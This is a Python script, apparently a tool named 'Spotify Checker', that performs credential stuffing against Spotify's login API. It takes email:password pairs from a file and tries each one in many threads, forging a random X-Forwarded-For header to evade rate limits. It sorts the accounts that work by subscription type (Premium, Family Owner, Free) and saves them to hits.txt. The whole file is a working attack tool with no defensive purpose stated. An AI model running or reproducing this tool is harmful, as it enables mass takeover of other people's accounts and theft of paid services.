import requests, time, os, sys
from collections import deque
import threading
from random import randint
from time import sleep


HitsPremium = 0
HitsFamily = 0
HitsFamilyOwner = 0
HitsFree = 0
hits = 0
Invalid = 0
list = []
accs = deque()
checked = 0
def login(user):
	global list
	global HitsPremium
	global HitsFamily
	global HitsFamilyOwner
	global HitsFree
	global hits
	global checked
	ip = ('.').join([str(randint(0, 255)) for x in range(4)])
	checked += 1
	email, passw = user.split(':')
	c = requests.session()
	url = 'https://accounts.spotify.com/en/login?continue=https:/www.spotify.com/us/account/overview/'
	headers = {'Accept':'*/*',  'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1',  'X-Forwarded-For':ip}
	page = c.get(url, headers=headers, timeout=1000)
	CSRF = page.cookies['csrf_token']
	headers = {'Accept':'*/*', 
	 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1',  'Referer':'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F&_locale=en-US',  'X-Forwarded-For':ip}
	url = 'https://accounts.spotify.com/api/login'
	login_data = {'remember':'true',  'username':email,  'password':passw,  'csrf_token':CSRF}
	cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : CSRF, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
	login = c.post(url, headers=headers, data=login_data, cookies=cookies)
	accFormated = email + ":" + passw
	data = str(login.content)
	
	if 'displayName' in data:
		
		url = 'https://www.spotify.com/us/account/overview/'
		url2 = "https://www.spotify.com/us/account/subscription/"
		start_page2 = c.get(url2, headers=headers)
		
		accFormated2 = "deine"
		if "Premium for Family" in start_page2.text:
			if 'Manage your family accounts' in start_page2.text:
				accFormated2=accFormated + " " + "Family Owner! "
				type = "Spotify Family Owner"
			else:
				accFormated2=accFormated + " " + "Premium for Family "
				type = "Spotify Family"
		elif '<h3 class="product-name">Spotify Free</h3>' in start_page2.text:
			type = "Free"
		elif "Spotify Premium" in start_page2.text:
			type = "Spotify Premium"
		elif "Premium for Students" in start_page2.text:
			type = "Spotify Students"
		else:
			accFormated2=accFormated + " " + "Something else "
			type = "Something Else"
			
		
		if(type == "Free"):
			HitsFree += 1
		elif(type == "Spotify Premium"):
			HitsPremium += 1
		elif(type == "Spotify Family"):
			HitsFamily += 1
			HitsPremium += 1
		elif(type == "Spotify Family Owner"):
			HitsFamily += 1
			HitsPremium += 1
			HitsFamilyOwner += 1
		else:
			HitsPremium += 1
		print(type)
		return accFormated2
	else:
		return False

def MainChecker():
	global accs
	global list
	global HitsPremium
	global HitsFamily
	global HitsFamilyOwner
	global HitsFree
	global hits
	global Invalid
	while(len(accs) > 0):
		acc = accs.popleft()
		check = login(acc)
		try: accs.remove(acc)
		except:
			if(len(acc) == 0):
				print("Fin")
				time.sleep(199999)
				time.sleep(199999)
				time.sleep(199999)
		if(check == False):
			Invalid += 1
		else:
			with open("hits.txt", 'a+') as hits:
				if(check != "deine"):
					hits.write(check + '\n')
				hits.close
	time.sleep(199999)
	
def Draw():
	global accs
	global list
	global HitsPremium
	global HitsFamily
	global HitsFamilyOwner
	global HitsFree
	global hits22
	while True:
		os.system('cls' if os.name=='nt' else 'clear')
		print('Spotify Checker Version 1.1 | Developed By Kinau')
		print(" ")
		print(" ")
		print("Accounts ")
		print(len(accs))
		print(" ")
		print("Hits with Premium ")
		print(HitsPremium)
		print("Free Accounts ") 
		print(HitsFree)
		print("Invalids ")
		print(Invalid)
		sleep(0.5)
			
			
			
roflka = (open("accounts.txt", 'r')).readlines()

for rasd in roflka:
	accs.append(rasd.rstrip())


th = int(input())

for i in range(th):
	threading.Thread(target=MainChecker).start()
	

threading.Thread(target=Draw).start()




	
	
	
	
